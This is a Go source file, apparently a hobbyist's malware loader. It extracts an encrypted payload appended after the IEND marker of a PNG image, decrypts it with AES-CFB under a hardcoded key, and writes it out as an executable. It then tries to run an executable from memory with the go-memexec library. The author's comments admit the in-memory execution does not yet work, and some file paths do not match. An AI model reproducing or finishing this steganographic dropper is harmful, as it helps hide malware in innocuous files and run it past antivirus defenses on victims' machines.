package main

import (
  "io"
  "io/ioutil"
  "crypto/aes"
  "crypto/cipher"
  "os"
  "bytes"
  "errors"
  "fmt"
  "encoding/hex"
  "strings"

  "github.com/amenzhinsky/go-memexec"
)

func decryptEOF(warezBytes []byte) {

  //ciphertext, err := ioutil.ReadFile("c:\\users\\blackfisk\\go scripts\\malware\\cipheroutput.txt")
  //if err != nil {
    //panic(err.Error())
  //}

  ciphertext := warezBytes
  key := []byte("example key 1234")

  block, err := aes.NewCipher(key)
  if err != nil {
    panic(err)
  }

  if len(ciphertext) < aes.BlockSize {
    err = errors.New("Ciphertext block size too short")
    return
  }

  iv := ciphertext[:aes.BlockSize]
  ciphertext = ciphertext[aes.BlockSize:]

  stream := cipher.NewCFBDecrypter(block, iv)
  stream.XORKeyStream(ciphertext, ciphertext)

  //fmt.Printf("%s", ciphertext)

  f, err := os.Create("decrypted/plaintext/initial/file/plaintexto.exe")
  if err != nil {
    panic(err.Error)
  }

  _, err = io.Copy(f, bytes.NewReader(ciphertext))
  if err != nil {
    panic(err.Error())
  }

  // https://github.com/brimstone/go-shellcode
  // https://github.com/amenzhinsky/go-memexec/blob/master/memexec_linux.go
  // memory execution that doesn't properly work
  // but I am working on it because quarantine is long and I have not much else to do

  b, err := ioutil.ReadFile("load/decrypted/file/to/memory/stego.exe")
  if err != nil {
    panic(err)
  }

  exe, err := memexec.New(b)
  if err != nil {
    panic(err)
  }
  defer exe.Close()

  cmd := exe.Command()
  cmd.Output()
}

func findEOF() string {
  f, err := os.Open("PNG/with/the/file/appended/smile.png")
  if err != nil {
    panic(err)
  }

  data, err := ioutil.ReadAll(f)
  if err != nil {
    panic(err)
  }

  encodedData := make([]byte, hex.EncodedLen(len(data)))
  hex.Encode(encodedData,data)

  if strings.Contains(string(encodedData), "04180d2545063489f48dd27fd5f9") {

    encodedData := string(encodedData)
    endOfFile := strings.Index(encodedData, "49454e44")

    warez := encodedData[endOfFile+16:]
    return warez

  } else {
    fmt.Println("False")
  }

  return ""
}

func main() {

  var warez string
  var warezBytes []byte

  warez = findEOF()

  warezBytes, err := hex.DecodeString(warez)
  if err != nil {
    panic(err)
  }
  //fmt.Printf("% x", warezBytes)

  decryptEOF(warezBytes)
}
